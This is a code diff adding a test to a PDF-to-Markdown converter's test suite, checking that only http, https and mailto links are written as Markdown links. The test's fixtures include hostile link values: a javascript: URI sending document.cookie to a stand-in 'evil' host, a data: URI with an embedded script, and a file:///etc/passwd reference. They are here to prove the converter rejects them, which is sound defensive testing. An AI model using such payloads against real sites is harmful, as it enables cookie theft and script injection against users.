@@ -229,6 +229,29 @@ describe('heuristics', () => {
     expect(text).toBe('See the [site](<https://example.org/a b>) for details.\n');
   });
 
+  test('only http, https and mailto links are written; other schemes stay plain text', async () => {
+    const link = (uri: string) => ({
+      rect: { x: 72 + 8 * 5.5, y: 699, width: 4 * 5.5, height: 12 },
+      uri,
+    });
+    for (const uri of [
+      "javascript:fetch('//evil/'+document.cookie)",
+      'JavaScript:alert(1)',
+      'data:text/html,<script>alert(1)</script>',
+      'file:///etc/passwd',
+      'not a url',
+    ]) {
+      const text = await md([
+        page([run('See the site for details.', 72, 700)], { links: [link(uri)] }),
+      ]);
+      expect(text).toBe('See the site for details.\n');
+    }
+    const mail = await md([
+      page([run('See the site for details.', 72, 700)], { links: [link('mailto:a@example.org')] }),
+    ]);
+    expect(mail).toBe('See the [site](mailto:a@example.org) for details.\n');
+  });
+
   test('columns on shared baselines are read column by column', async () => {
     const left = ['Left one', 'Left two', 'Left three'];
     const right = ['Right one', 'Right two', 'Right three'];
